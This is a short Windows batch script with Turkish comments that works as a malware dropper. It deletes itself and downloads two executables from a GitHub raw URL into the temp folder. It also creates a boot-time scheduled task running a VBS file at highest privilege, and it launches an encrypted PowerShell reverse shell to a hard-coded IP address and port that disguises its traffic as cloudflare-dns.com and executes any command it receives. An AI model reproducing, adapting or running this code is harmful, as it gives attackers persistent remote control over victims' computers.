@echo off
setlocal

set "marker=%temp%\marker.txt"

REM Görevi kontrol et
schtasks /query /tn "TempVBS_OnBoot" >nul 2>&1
set "taskExists=%errorlevel%"

if %taskExists% neq 0 (
    REM Görev YOKSA
    del /f /q "asd.bat"
    cd /d %temp%
    curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/NotMyfault64.exe -o NotMyfault64.exe
    curl https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/c.exe -o c.exe
    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST

    if not exist "%marker%" (
        echo ran > "%marker%"
        timeout /t 10 >nul
        start "" "%temp%\rb.vbs"
    )
) else (
    REM Görev VARSA
    del /f /q "asd.bat"
    cd /d %temp%
    schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
    start c.exe

    powershell -Command "$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('185.194.175.132', 7000); $NetworkStream = $TCPClient.GetStream(); $SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback])); $SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false); if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close(); exit}; $StreamWriter = New-Object IO.StreamWriter($SslStream); function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096; $StreamWriter.Write($String + 'SHELL> '); $StreamWriter.Flush()}; WriteToStream ''; while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}; WriteToStream ($Output)} $StreamWriter.Close()"
)

endlocal
